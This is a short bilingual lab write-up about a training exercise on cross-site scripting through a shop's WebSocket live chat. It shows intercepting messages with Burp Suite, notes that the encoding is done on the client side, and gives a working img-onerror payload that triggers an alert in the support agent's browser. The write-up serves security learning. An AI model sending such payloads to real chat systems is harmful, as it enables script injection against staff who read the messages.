This online shop has a live chat feature implemented using [WebSockets](https://portswigger.net/web-security/websockets).

Chat messages that you submit are viewed by a support agent in real time.

To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.



該在線商店具有使用 [WebSockets](https://portswigger.net/web-security/websockets) 實現的實時聊天功能。

您提交的聊天消息由支持代理實時查看。

要解決實驗室問題，請使用 WebSocket 消息在支持代理的瀏覽器中觸發“alert()”彈出窗口。







live chat 進入 聊天室:


You:123

Hal Pline: typing 

Hal Pline:What did your last slave machine die of?


拿BP 可以看一下
輸入888 send
可以 intercept 

to server:
```
{"message":"888"}

```

from server:
```
{"user":"You","content":"888"}
```

from server:
```
TYPING
```

from server:
```
{"user":"Hal Pline","content":"Sorry, I don't know that one; or any other one you're thinking up right now."}
```


注意:
截包過程不能太久，我猜可能是協議的關係，你握手步驟失敗太久會直接斷開。



而歷史訊息都會流下:
如果你重新f5然後去bp 的websocket history 可以發現，第一次和server 建立後，它會一直丟 client 歷史訊息。


也就是說，伺服器會儲存我們的信息，這就很危險。

你在很一個黑客聊天，結果它可以用 儲存息型 xss 攻擊你。

而你之後只要打開一次聊天室，就會中招。



這題是要我們alert(1)

payload:
```
<img src=1 onerror="alert(1)"></img>
失敗


```

直接輸入會失敗。

你用bp看一下:
被轉譯了
```


{"message":"&lt;img src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/img&gt;"}

```


前端修改了一次，但發現後端也可能會檔一些符號，所以也不是能隨便alert(1)

又或許是lab只允許這個payload 也說不定。


最後成功的payload:
```

去掉雙引號
<img src=1 onerror=alert(1)></img>

```






